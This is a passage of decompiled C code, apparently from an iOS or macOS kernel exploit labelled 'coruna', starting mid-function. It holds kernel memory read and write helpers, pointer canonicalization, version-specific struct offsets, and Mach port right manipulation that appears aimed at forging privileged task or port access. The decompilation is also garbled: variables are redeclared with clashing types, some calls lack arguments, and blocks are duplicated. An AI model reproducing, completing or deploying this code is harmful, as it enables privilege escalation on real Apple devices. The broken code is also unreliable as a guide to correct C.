      off = coruna_strsep(action,"14 D9 33 F8",0,1);
      if (off != 0) {
        off = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off + -8);
        if (off == 0) {
          return 0xad011;
        }
        u = coruna_cpu_core_count();
        if (u == 0) {
          version = 0;
        }
        else {
          size = 0;
          version = 0;
          host_info = u;
          do {
            err = coruna_kernel6544_trampoline_0001a670(handle,off + (unsigned long)(*(int *)(handle + 0x168) * size),
                                       &thread_attr);
            if (err == 0) {
              return 0x2800f;
            }
            if (thread_attr == 0) {
              handle = 0;
            }
            else {
              addr = coruna_ptr_canonicalize(handle);
              handle = thread_attr;
              if (addr == 0) {
                return 0x28026;
              }
            }
            err = coruna_kernel6544_trampoline_0001a670(handle,handle + 0x28,&bootargs);
            if (err == 0) {
              return 0x2800f;
            }
            handle = coruna_ptr_canonicalize(handle,bootargs);
            if (handle == 0) {
              return 0x28026;
            }
            err = coruna_kernel6544_via_ioconnectcallmethod(handle,ptr + bootargs,action);
            if (err == 0) {
              return 0x2800f;
            }
            if (1 < action[0] - 1U) {
              return 0x28011;
            }
            if (action[0] == flags) {
              if (*size <= version) {
                return 0xad00c;
              }
              *(long *)(addr_2 + (unsigned long)version * 8) = thread_attr;
              version = version + 1;
            }
            size = size + 1;
          } while (size < u);
        }
        *size = version;
        return 0;
      }
    }
    return 0xad011;
  }
  off = 0x28;
fail:
  u = _host_processors(*(host_priv_t *)(&k_kernel_slot_1920 + handle),&serial_buf,&host_info);
  if (u == 0) {
    if (host_info == 0) {
      version = 0;
    }
    else {
      port = 0;
      version = 0;
      scratch = 0x2800e;
      {
        int hp_break = 0;
        do {
          handle = coruna_kernel6544_via_return_zero_1f078(handle,serial_buf[port]);
          thread_attr = handle;
          u = scratch;
          if ((handle == 0) ||
             (err = coruna_kernel6544_trampoline_0001a670(handle,handle + off,&bootargs), u = 0x2800f, err == 0
             )) {
            hp_break = 1;
            break;
          }
          addr = coruna_ptr_canonicalize(handle,bootargs);
          if (addr == 0) {
            u = 0x28026;
            hp_break = 1;
            break;
          }
          err = coruna_kernel6544_via_ioconnectcallmethod(handle,ptr + bootargs,action);
          if (err == 0) {
            hp_break = 1;
            break;
          }
          if (1 < action[0] - 1U) {
            u = 0x28011;
            hp_break = 1;
            break;
          }
          if (action[0] == flags) {
            if (*size <= version) {
              u = 0xad00c;
              hp_break = 1;
              break;
            }
            *(long *)(addr_2 + (unsigned long)version * 8) = handle;
            version = version + 1;
          }
          port = port + 1;
        } while (port < host_info);
        if (!hp_break) {
          *size = version;
          u = 0;
        }
      }
    }
    ptr = k_kernel_mach_task_self_slot;
    if (host_info == 0) {
      size = 0;
    }
    else {
      port = 0;
      do {
        _mach_port_deallocate(*(ipc_space_t *)ptr,serial_buf[port]);
        port = port + 1;
      } while (port < host_info);
      size = (unsigned long)host_info << 2;
    }
    _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)serial_buf,size);
  }
  else {
    u = u | 0x80000000;
  }
  return u;
}





uint64_t coruna_return_zero_2dae4(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (1 < err - 0x1f53U) {
    if (err == 0x1809) {
      return 0x58;
    }
    if (err != 0x1c1b) {
      return 0;
    }
  }
  return 0x60;
}





long coruna_return_zero_2db28(long handle,long addr_2)
{
  int err;
  bool err;
  long handle;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809 || err == 0x1c1b) {
      handle = 0x40;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x30;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x20;
  }
  return handle + addr_2;
}





void coruna_kernel6544_via_return_zero_2db28(uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel6544_via_return_zero_2c0bc(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_2db28(val,handle);
  return;
}





long coruna_kernel6544_via_kernel6544_via_return_zero_2db28(uint64_t val)
{
  int err;
  long handle;
  long addr;
  long scratch;
  
  scratch = coruna_kernel6544_via_return_zero_2db28();
  addr = scratch;
  if (scratch != 0) {
    err = coruna_kernel6544_residual_256(val,scratch,&scratch);
    if (err == 0) {
      addr = 0;
    }
    else {
      handle = coruna_ptr_canonicalize(val,scratch);
      addr = 0;
      if (handle != 0) {
        addr = scratch;
      }
    }
  }
  return addr;
}





long coruna_kernel6544_via_kernel6544_via_kernel6544_via_return_zero_2db28(long handle)
{
  int err;
  long handle;
  unsigned long u;
  long scratch;
  
  scratch = coruna_kernel6544_via_kernel6544_via_return_zero_2db28();
  if (scratch != 0) {
    u = *(unsigned long *)(handle + 0x158);
    if (u < 0x1c1b0a80100000) {
      handle = scratch + 0x18;
    }
    else {
      if (0x44a < u >> 0x2b) {
        return scratch + 0x50;
      }
      handle = 0x18;
      if (u < 0x1c1b1914600000) {
        handle = 0x20;
      }
      handle = handle + scratch;
    }
    err = coruna_kernel6544_residual_256(handle,handle,&scratch);
    if (err == 0) {
      scratch = 0;
    }
  }
  return scratch;
}





long coruna_return_zero_2dd18(long handle,int flags)
{
  int err;
  uint64_t u;
  long handle;
  long scratch;
  
  handle = *(long *)(handle + 0x1a8);
  if (handle == 0) {
    u = coruna_processor_set_info(handle);
    if ((int)u + 1U < 2) {
      return 0;
    }
    handle = coruna_kernel6544_via_return_zero_2c0bc(handle,*(uint32_t *)k_kernel_mach_task_self_slot,u);
    if (handle == 0) {
      return 0;
    }
    *(long *)(handle + 0x1a8) = handle;
  }
  if (flags == 1) {
    return handle;
  }
  handle = coruna_return_zero_2b000(handle);
  if (handle == 0) {
    return 0;
  }
  err = coruna_kernel6544_residual_256(handle,handle + (unsigned long)(uint)(*(int *)(handle + 0x168) * flags) + 0x10,
                       &scratch);
  if (err != 0) {
    return scratch;
  }
  return 0;
}





uint64_t coruna_kernel6544_via_kernel6544_via_return_zero_2b000_6(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  long handle;
  uint64_t u;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return 0x28007;
    }
  }
  else if (1 < err - 0x1f53U && err != 0x2258) {
    return 0x28007;
  }
  handle = coruna_kernel6544_via_return_zero_2b000(handle);
  if (handle == 0) {
    u = 0x28025;
  }
  else {
    err = coruna_kernel6544_residual_256(handle,handle + 0x38,&scratch);
    if (err == 0) {
      u = 0x2800f;
    }
    else {
      handle = coruna_ptr_canonicalize(handle,scratch);
      if (handle == 0) {
        u = 0x28026;
      }
      else {
        u = 0;
        *id_2 = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_kernel6544_via_ptr_canonicalize_7(long handle,int flags,uint64_t *val)
{
  int err;
  long handle;
  int status;
  long addr;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
fail:
      addr = 0xf8;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        addr = 0x100;
      }
      {
        handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
        if (handle == 0) {
        return 0x2800e;
        }
        err = coruna_kernel6544_residual_256(handle,handle + addr,&thread_attr);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,thread_attr);
        if (addr != 0) {
        if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
        err = coruna_kernel6544_residual_256(handle,thread_attr,&bootargs);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,bootargs);
        if (addr == 0) {
        return 0x28026;
        }
        }
        else {
        bootargs = thread_attr;
        }
        err = coruna_kernel6544_residual_256(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
        &scratch);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,scratch);
        if (addr != 0) {
        *val = scratch;
        return 0;
        }
        }
        return 0x28026;
      }
    }
    if (err == 0x1809) {
      addr = 0x108;
      {
        handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
        if (handle == 0) {
        return 0x2800e;
        }
        err = coruna_kernel6544_residual_256(handle,handle + addr,&thread_attr);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,thread_attr);
        if (addr != 0) {
        if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
        err = coruna_kernel6544_residual_256(handle,thread_attr,&bootargs);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,bootargs);
        if (addr == 0) {
        return 0x28026;
        }
        }
        else {
        bootargs = thread_attr;
        }
        err = coruna_kernel6544_residual_256(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
        &scratch);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,scratch);
        if (addr != 0) {
        *val = scratch;
        return 0;
        }
        }
        return 0x28026;
      }
    }
    status = 0x1c1b;
  }
  else {
    {
      addr = 0xf8;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      addr = 0x100;
      }
      {
      handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
      if (handle == 0) {
      return 0x2800e;
      }
      err = coruna_kernel6544_residual_256(handle,handle + addr,&thread_attr);
      if (err == 0) {
      return 0x2800f;
      }
      addr = coruna_ptr_canonicalize(handle,thread_attr);
      if (addr != 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      err = coruna_kernel6544_residual_256(handle,thread_attr,&bootargs);
      if (err == 0) {
      return 0x2800f;
      }
      addr = coruna_ptr_canonicalize(handle,bootargs);
      if (addr == 0) {
      return 0x28026;
      }
      }
      else {
      bootargs = thread_attr;
      }
      err = coruna_kernel6544_residual_256(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
      &scratch);
      if (err == 0) {
      return 0x2800f;
      }
      addr = coruna_ptr_canonicalize(handle,scratch);
      if (addr != 0) {
      *val = scratch;
      return 0;
      }
      }
      return 0x28026;
      }
    }
    status = 0x2712;
  }
  if (err != status) {
    return 0x2802c;
  }
  addr = 0xf8;
code_r0x0002df60:
  handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (handle == 0) {
    return 0x2800e;
  }
  err = coruna_kernel6544_residual_256(handle,handle + addr,&thread_attr);
  if (err == 0) {
    return 0x2800f;
  }
  addr = coruna_ptr_canonicalize(handle,thread_attr);
  if (addr != 0) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      err = coruna_kernel6544_residual_256(handle,thread_attr,&bootargs);
      if (err == 0) {
        return 0x2800f;
      }
      addr = coruna_ptr_canonicalize(handle,bootargs);
      if (addr == 0) {
        return 0x28026;
      }
    }
    else {
      bootargs = thread_attr;
    }
    err = coruna_kernel6544_residual_256(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
                         &scratch);
    if (err == 0) {
      return 0x2800f;
    }
    addr = coruna_ptr_canonicalize(handle,scratch);
    if (addr != 0) {
      *val = scratch;
      return 0;
    }
  }
  return 0x28026;
}





uint64_t coruna_kernel6544_via_ptr_canonicalize_8(long handle,uint64_t val,uint64_t *id_2)
{
  bool err;
  int err;
  uint64_t u;
  long handle;
  int status;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  u = 0x2802c;
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if ((err || err == status) &&
     (u = coruna_kernel6544_via_ptr_canonicalize_7(handle,val,&thread_attr), (int)u == 0)) {
    err = coruna_kernel6544_residual_256(handle,thread_attr + 0x10,&bootargs);
    if (err == 0) {
      u = 0x2800f;
    }
    else {
      handle = coruna_ptr_canonicalize(handle,bootargs);
      if (handle != 0) {
        err = coruna_kernel6544_residual_256(handle,bootargs + 0x38,&scratch);
        if (err == 0) {
          return 0x2800f;
        }
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
          *id_2 = scratch;
          return 0;
        }
      }
      u = 0x28026;
    }
  }
  return u;
}





uint64_t coruna_kernel6544_via_ctx_test_flag_11(long handle,int flags,uint32_t *size)
{
  int err;
  uint64_t u;
  
  if (flags == 0) {
    err = coruna_ctx_test_flag(handle,8);
    if (err == 0) {
      u = 0xffffffe000000000;
      if (0x225814018fffff < *(unsigned long *)(handle + 0x158)) {
        err = coruna_ctx_test_flag(handle,0x2000);
        u = 0xffffffdc00000000;
        if (err != 0) {
          u = 0xffffffe000000000;
        }
      }
    }
    else {
      u = 0xfffffe0000000000;
    }
    *size = 6;
  }
  else {
    u = 0;
  }
  return u;
}





void coruna_pthread_attr_setdetachstate(uint *size,uint flags_2,uint *count_3)
{
  long *ptr;
  unsigned long u;
  uint size;
  int err;
  uint *ptr;
  void **lppv6;
  long handle;
  unsigned long version;
  long addr;
  uint *scratch;
  uint bootargs;
  uint32_t thread_attr;
  pthread_t host_info;
  pthread_attr_t serial_buf;
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = size;
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
  return;
  }
  ___stack_chk_fail(ptr);
}





unsigned long coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_2(uint64_t arg,uint64_t val,int n)

{
  int count;
  long serial_7;
  unsigned long u;
  uint cache_33;
  
  serial_7 = coruna_return_zero_2b16c();
  u = 0;
  if ((serial_7 != 0) && (u = coruna_kernel6544_via_fcntl_1bf84(arg,serial_7,&cache_33), (int)u != 0)) {
    if (cache_33 < 0x80000001) {
      count = coruna_mach_vm_machine_attribute(arg,serial_7,cache_33 + n);
      u = (unsigned long)(count != 0);
    }
    else {
      u = 0;
    }
  }
  return u;
}





unsigned long coruna_kernel6544_via_nop_stub_6_7(uint64_t arg,long val,int n)

{
  int count;
  unsigned long type_id_14;
  int cache_33;
  
  type_id_14 = coruna_nop_stub_6(arg,val + 4,4,&cache_33);
  if ((int)type_id_14 != 0) {
    cache_33 = cache_33 + n;
    count = coruna_nop_stub_7(arg,val + 4,&cache_33,4);
    type_id_14 = (unsigned long)(count != 0);
  }
  return type_id_14;
}





uint64_t coruna_kernel6544_via_kernel6544_via_kernel6544_via_fcntl_1bf84_2(uint64_t val,uint64_t id_2)
{
  coruna_kernel6544_via_nop_stub_6_7(val,id_2,1);
  coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_2(val,id_2,1);
  return 0;
}





uint64_t coruna_return_zero_2e5d4(long handle,long addr_2,int flags)
{
  uint64_t u;
  long handle;
  long scratch;
  int bootargs;
  
  u = coruna_kernel6544_via_fcntl_1bf84(handle,addr_2 + 0x10,&bootargs);
  if ((int)u == 0) {
    return u;
  }
  if (bootargs - 1U >> 0x14 == 0) {
    u = coruna_kernel6544_via_mach_vm_machine_attribute(handle,addr_2 + 0x10,bootargs + flags);
    if ((int)u == 0) {
      return u;
    }
    if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
      u = coruna_kernel6544_residual_256(handle,addr_2,&scratch);
      if ((int)u == 0) {
        return u;
      }
      handle = coruna_ptr_canonicalize(handle,scratch);
      if (handle == 0) {
        return 0;
      }
      handle = 0;
      if (*(int *)(handle + 0x140) < 0x2712) {
        handle = 0x18;
      }
      u = coruna_kernel6544_via_fcntl_1bf84(handle,handle + scratch,&bootargs);
      if ((int)u == 0) {
        return u;
      }
      if (bootargs - 1U >> 0x14 != 0) goto fail;
      u = coruna_mach_vm_machine_attribute(handle,scratch + handle,bootargs + flags);
      if ((int)u == 0) {
        return u;
      }
    }
    u = 1;
  }
  else {
fail:
    u = 0;
  }
  return u;
}





uint32_t coruna_kernel6544_via_return_zero_2e5d4(uint64_t val,uint64_t id_2)
{
  int err;
  uint32_t u;
  
  err = coruna_return_zero_2e5d4(val,id_2,0x10);
  u = 0x1001;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint32_t coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_3(uint64_t val,long handle)
{
  int err;
  uint32_t u;
  int scratch;
  
  u = 0x2800f;
  err = coruna_kernel6544_via_fcntl_1bf84(val,handle + 0x10,&scratch);
  if (err != 0) {
    if (scratch == 0) {
      u = 0x28011;
    }
    else {
      err = coruna_mach_vm_machine_attribute(val,handle + 0x10,scratch + 4);
      u = 0;
      if (err == 0) {
        u = 0x28010;
      }
    }
  }
  return u;
}





void coruna_ctx_set_flag(uint *size,uint flags_2)
{
  *size = *size | flags_2;
  return;
}





void coruna_ctx_clear_flag(uint *size,uint flags_2)
{
  *size = *size & (flags_2 ^ 0xffffffff);
  return;
}





bool coruna_ctx_test_flag(uint *size,uint flags_2)
{
  return (*size & flags_2) != 0;
}





long coruna_return_zero_2e7b0(long handle)
{
  int err;
  long handle;
  uint32_t scratch;
  long bootargs;
  
  bootargs = 0;
  if (*(long *)(handle + 0x210) != 0) {
    return *(long *)(handle + 0x210);
  }
  if (*(long *)(&k_kernel_slot_19d0 + handle) != 0) {
    handle = coruna_return_zero_2b0c0(handle);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel6544_residual_256(handle,handle,&bootargs);
    if (err != 0) {
      if (bootargs == 0) {
        scratch = 0x200;
        bootargs = coruna_vm_deallocate_2c8ec(handle,&scratch);
        if (bootargs == 0) {
          return 0;
        }
        err = coruna_call_mach_vm_machine_attribute_29df8(handle,handle,bootargs);
        if (err == 0) {
          return 0;
        }
      }
      else {
        handle = coruna_ptr_canonicalize(handle);
        if (handle == 0) {
          return 0;
        }
      }
      *(long *)(handle + 0x210) = bootargs;
      return bootargs;
    }
  }
  return 0;
}





uint64_t coruna_kernel6544_via_return_zero_2e7b0(long handle,uint size,long *addr_2)
{
  uint64_t u;
  long scratch;
  
  if (size < 0xe) {
    scratch = coruna_return_zero_2e7b0();
    u = 0;
    if ((scratch != 0) &&
       (u = coruna_kernel6544_residual_256(handle,scratch + (unsigned long)(*(int *)(handle + 0x168) * size),
                             &scratch), (int)u != 0)) {
      *addr_2 = scratch;
      u = 1;
    }
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_kernel6544_via_nop_stub_7_4(long handle,uint size,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  if (size < 0xe) {
    err = *(int *)(handle + 0x168);
    scratch = val;
    handle = coruna_return_zero_2e7b0();
    u = 0;
    if (handle != 0) {
      u = coruna_nop_stub_7(handle,handle + (unsigned long)(err * size),&scratch,err);
    }
  }
  else {
    u = 0;
  }
  return u;
}
bool coruna_voucher_create(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  mach_port_t lm1;
  int err;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  scratch = k_kernel_rodata_word_0003b7f8;
  scratch = k_kernel_rodata_word_3b7f0;
  bootargs = id_2;
  lm1 = _mach_host_self();
  err = _host_create_mach_voucher(lm1,&scratch,0x18,size_3);
  return err == 0;
}





uint coruna_proc_pidinfo(uint64_t val,uint64_t id_2)
{
  pid_t pid;
  int err;
  uint u;
  uint size;
  int *err;
  uint *ptr;
  uint64_t scratch;
  
  scratch = 0;
  pid = _getpid();
  err = _proc_pidinfo(pid,0x20,0,&scratch,8);
  if (err == 8) {
    if ((uint)scratch < (uint)id_2) {
      u = coruna_mach_port_insert_right_2b2b0(id_2);
      size = 0;
      if (u != 0) {
        size = u | 0x80000000;
      }
    }
    else {
      size = 0;
    }
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    size = -*ptr;
    if (-1 < err) {
      size = *ptr;
    }
    size = size | 0x40000000;
  }
  return size;
}





kern_return_t coruna_mach_port_insert_right_2b2b0(int flags)
{
  uint name;
  uint8_t *ptr;
  kern_return_t lk2;
  kern_return_t lk3;
  mach_port_name_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
  if (lk2 == 0) {
    name = flags << 8 | 3;
    lk3 = _mach_port_insert_right(*(ipc_space_t *)ptr,name,scratch,0x15);
    if (lk3 == 0) {
      _mach_port_deallocate(*(ipc_space_t *)ptr,name);
      lk2 = 0;
    }
    else {
      lk2 = 0;
      if (lk3 != 0xd) {
        lk2 = lk3;
      }
    }
  }
  if (1 < scratch + 1) {
    _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
  }
  return lk2;
}





uint coruna_proc_pidinfo_2b364(uint64_t val,uint size)
{
  pid_t pid;
  int err;
  uint u;
  uint size;
  int *err;
  uint *ptr;
  uint64_t scratch;
  
  scratch = 0;
  pid = _getpid();
  err = _proc_pidinfo(pid,0x20,0,&scratch,8);
  if (err == 8) {
    if (scratch < size) {
      u = coruna_mach_port_insert_right_2b2b0((size - scratch) + (int)scratch);
      size = 0;
      if (u != 0) {
        size = u | 0x80000000;
      }
    }
    else {
      size = 0;
    }
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    size = -*ptr;
    if (-1 < err) {
      size = *ptr;
    }
    size = size | 0x40000000;
  }
  return size;
}





uint8_t * coruna_arc4random_buf(long handle,long addr_2,mach_port_name_t *arg)
{
  ipc_space_t task;
  uint u;
  uint8_t *ptr;
  mach_port_t poly;
  bool err;
  int err;
  uint size;
  uint version;
  int status;
  uint64_t port;
  uint8_t *buf;
  long handle;
  long addr;
  mach_port_name_t lm12;
  uint8_t *str;
  uint scratch;
  long bootargs;
  uint64_t thread_attr;
  long host_info;
  uint64_t serial_buf;
  vm_address_t action;
  
  size = 0x28010;
  action = action & 0xffffffff00000000;
  err = coruna_kernel6544_via_fcntl_1bf84(handle,addr_2,&action);
  version = 0;
  if (-1 < (int)(uint)action) {
    version = 0x28008;
  }
  str = (uint8_t *)0x2800f;
  u = 0x2800f;
  if (err != 0) {
    u = version;
  }
  if (err == 0) {
    return (uint8_t *)(unsigned long)u;
  }
  if (-1 < (int)(uint)action) {
    return (uint8_t *)(unsigned long)u;
  }
  if (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158)) {
    version = 0x200000;
    if (*(unsigned long *)(handle + 0x158) < 0x1f541900000000) {
      version = 0x400000;
    }
    port = coruna_kernel6544_via_fcntl_1bf84(handle,addr_2 + 8,&action);
    if ((int)port == 0) {
      return (uint8_t *)0x2800f;
    }
    if ((((uint)action & version) != 0) &&
       (port = coruna_mach_vm_machine_attribute(handle,addr_2 + 8,(uint)action & (version ^ 0xffffffff)),
       (int)port == 0)) {
      return (uint8_t *)0x28010;
    }
    if (0x1f543c407fffff < *(unsigned long *)(handle + 0x158)) {
      serial_buf = 0;
      thread_attr = 0;
      scratch = 0;
      action = 0;
      buf = (uint8_t *)coruna_proc_pidinfo_2b364(port,8);
      ptr = k_kernel_mach_task_self_slot;
      if ((int)buf != 0) {
        return buf;
      }
      handle = coruna_pid_for_task(handle,*(uint32_t *)k_kernel_mach_task_self_slot,&bootargs,
                            (long)&serial_buf + 4);
      if (handle == 0) {
        return (uint8_t *)0x28026;
      }
      version = serial_buf * (uint)bootargs;
      size = _vm_allocate(*(vm_map_t *)ptr,&action,(unsigned long)version,1);
      if (size == 0) {
        err = coruna_nop_stub_6(handle,handle,serial_buf * (uint)bootargs,action);
        if (err == 0) {
          lm12 = 0;
        }
        else {
          if ((uint)bootargs != 0) {
            size = 0;
            do {
              host_info = 0;
              handle = action + serial_buf * size;
              ___memcpy_chk(&host_info,handle,(long)*(int *)(handle + 0x168),8);
              if (((host_info != 0) && (host_info = coruna_kernel6544_via_ctx_test_flag_6(handle), host_info == addr_2)) &&
                 (u = *(uint *)(handle + *(int *)(handle + 0x168)), (u >> 0x10 & 1) != 0))
              {
                str = (uint8_t *)0x0;
                lm12 = (mach_port_name_t)(coruna_u64_pack((size), (u)) >> 0x18);
                if ((action != 0) && (version != 0)) {
                _vm_deallocate(*(vm_map_t *)ptr,action,(unsigned long)version);
                }
                if ((int)str != 0) {
                return str;
                }
                if (lm12 + 1 < 2) {
                version = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf);
                if (version == 0) {
                handle = coruna_ret_stub_3(handle,(mach_port_name_t)serial_buf);
                if (handle == 0) {
                return (uint8_t *)0x2800e;
                }
                addr = coruna_return_zero_2af7c(handle,handle);
                if (addr == 0) {
                return (uint8_t *)0x2802c;
                }
                err = *(int *)(handle + 0x168);
                status = coruna_kernel6544_via_fcntl_1bf84(handle,addr_2,&scratch);
                if (status == 0) {
                return (uint8_t *)0x2800f;
                }
                if ((((scratch >> 10 & 1) != 0) &&
                (status = coruna_mach_vm_machine_attribute(handle,addr_2,scratch & 0xfffffbff), status == 0)) ||
                (err = coruna_kernel6544_residual_257(handle,handle + (unsigned long)(uint)(((int)addr - (int)handle) +
                err * 2),addr_2), err == 0)) {
                return (uint8_t *)0x28010;
                }
                version = _mach_port_request_notification
                (*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,0x46,1,0,0x15,
                (mach_port_t *)((long)&thread_attr + 4));
                if (version == 0) {
                if (thread_attr + 1 < 2) {
                return (uint8_t *)0x28008;
                }
                str = (uint8_t *)coruna_proc_pidinfo_2b364(0,8);
                if ((int)str != 0) {
                return str;
                }
                handle = coruna_call_return_zero_2c0bc(handle,thread_attr);
                if (handle == 0) {
                return (uint8_t *)0x2800e;
                }
                err = coruna_kernel6544_via_fcntl_1bf84(handle,handle + 8,&thread_attr);
                if (err == 0) {
                return (uint8_t *)0x2800f;
                }
                if (((uint)thread_attr & 0x1f0000) != 0x40000) {
                return (uint8_t *)0x28011;
                }
                thread_attr = thread_attr & 0xffffffffffe0ffff | 0x10000;
                err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                if (err == 0) {
                return (uint8_t *)0x28010;
                }
                version = _mach_port_mod_refs(*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,1,-1);
                if (version == 0) {
                size = 0;
                task = *(ipc_space_t *)ptr;
                poly = thread_attr;
                do {
                action = action & 0xffffffff00000000;
                version = _mach_port_allocate(task,1,(mach_port_name_t *)&action);
                if (version != 0) break;
                version = _mach_port_mod_refs(task,(uint)action,1,-1);
                if (version != 0) break;
                version = _mach_port_insert_right(task,(uint)action,poly,0x13);
                if (version == 0) {
                lm12 = (uint)action;
                if ((scratch >> 10 & 1) != 0) {
                coruna_mach_vm_machine_attribute(handle,addr_2);
                }
                handle = coruna_call_return_zero_2c0bc(handle,thread_attr);
                if (handle == 0) {
                return (uint8_t *)0x2800e;
                }
                err = coruna_kernel6544_via_fcntl_1bf84(handle,handle + 8,&thread_attr);
                if (err == 0) {
                return (uint8_t *)0x2800f;
                }
                if (((uint)thread_attr & 0x1f0000) != 0x10000) {
                return (uint8_t *)0x28011;
                }
                thread_attr = thread_attr & 0xffffffffffe0ffff | 0x100000;
                err = coruna_mach_vm_machine_attribute(handle,handle + 8);
                if (err == 0) {
                return (uint8_t *)0x28010;
                }
                version = _mach_port_mod_refs(*(ipc_space_t *)ptr,thread_attr,4,-1);
                if (version == 0) {
                *arg = lm12;
                return (uint8_t *)0x0;
                }
                break;
                }
                err = size < 8;
                size = size + 1;
                } while ((version & 0xfffffff7) == 5 && err);
                }
                }
                }
                }
                else {
                version = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm12,0,1);
                if (version == 0) {
                *arg = lm12;
                return (uint8_t *)0x0;
                }
                }
                return (uint8_t *)(unsigned long)(version | 0x80000000);
              }
              size = size + 1;
            } while (size < (uint)bootargs);
          }
          lm12 = 0;
          str = (uint8_t *)0x0;
        }
      }
      else {
        lm12 = 0;
        str = (uint8_t *)(unsigned long)(size | 0x80000000);
      }
fail:
      if ((action != 0) && (version != 0)) {
        _vm_deallocate(*(vm_map_t *)ptr,action,(unsigned long)version);
      }
      if ((int)str != 0) {
        return str;
      }
      if (lm12 + 1 < 2) {
        version = _mach_port_allocate(*(ipc_space_t *)ptr,1,(mach_port_name_t *)&serial_buf);
        if (version == 0) {
          handle = coruna_ret_stub_3(handle,(mach_port_name_t)serial_buf);
          if (handle == 0) {
            return (uint8_t *)0x2800e;
          }
          addr = coruna_return_zero_2af7c(handle,handle);
          if (addr == 0) {
            return (uint8_t *)0x2802c;
          }
          err = *(int *)(handle + 0x168);
          status = coruna_kernel6544_via_fcntl_1bf84(handle,addr_2,&scratch);
          if (status == 0) {
            return (uint8_t *)0x2800f;
          }
          if ((((scratch >> 10 & 1) != 0) &&
              (status = coruna_mach_vm_machine_attribute(handle,addr_2,scratch & 0xfffffbff), status == 0)) ||
             (err = coruna_kernel6544_residual_257(handle,handle + (unsigned long)(uint)(((int)addr - (int)handle) +
                                                                 err * 2),addr_2), err == 0)) {
            return (uint8_t *)0x28010;
          }
          version = _mach_port_request_notification
                            (*(ipc_space_t *)ptr,(mach_port_name_t)serial_buf,0x46,1,0,0x15,
                             (mach_port_t *)((long)&thread_attr + 4));
          if (version == 0) {
            if (thread_attr + 1 < 2) {
              return (uint8_t *)0x28008;
            }
